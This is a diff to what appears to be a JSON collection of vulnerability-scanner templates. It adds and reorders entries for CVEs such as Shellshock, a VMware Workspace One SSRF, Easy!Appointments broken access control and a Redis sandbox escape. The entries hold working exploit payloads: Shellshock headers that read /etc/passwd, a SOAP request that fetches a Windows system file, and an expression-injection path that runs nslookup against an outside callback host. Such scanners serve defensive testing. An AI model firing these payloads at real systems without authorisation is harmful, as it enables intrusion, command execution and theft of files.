@@ -3311,9 +3311,9 @@
       "requests": [
         {
           "headers": {
+            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -10911,9 +10911,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
-            "Cookie": "Login",
             "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
-            "content-type": "text/xml"
+            "content-type": "text/xml",
+            "Cookie": "Login"
           },
           "method": "POST",
           "path": [
@@ -12896,6 +12896,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/hystrix/;a=a/__${T (java.lang.Runtime).getRuntime().exec(\"nslookup {{interactsh-url}}\")}__::.x/"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-22054",
+      "info": {
+        "name": "VMWare Workspace One UEM SSRF",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/Catalog/BlobHandler.ashx?Url=YQB3AGUAdgAyADoAawB2ADAAOgB4AGwAawBiAEoAbwB5AGMAVwB0AFEAMwB6ADMAbABLADoARQBKAGYAYgBHAE4ATgBDADUARQBBAG0AZQBZAE4AUwBiAFoAVgBZAHYAZwBEAHYAdQBKAFgATQArAFUATQBkAGcAZAByAGMAMgByAEUAQwByAGIAcgBmAFQAVgB3AD0A"
           ]
         }
       ]
@@ -16782,6 +16797,21 @@
       "id": "CVE-2022-0482",
       "info": {
         "name": "Easy!Appointments Broken Access Control",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET / HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\n",
+            "POST /index.php/backend_api/ajax_get_calendar_events HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\n\ncsrfToken={{csrf_token}}&startDate=2022-01-01&endDate=2022-01-01\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-0543",
+      "info": {
+        "name": "Redis Sandbox Escape RCE",
         "severity": "critical"
       },
       "requests": [
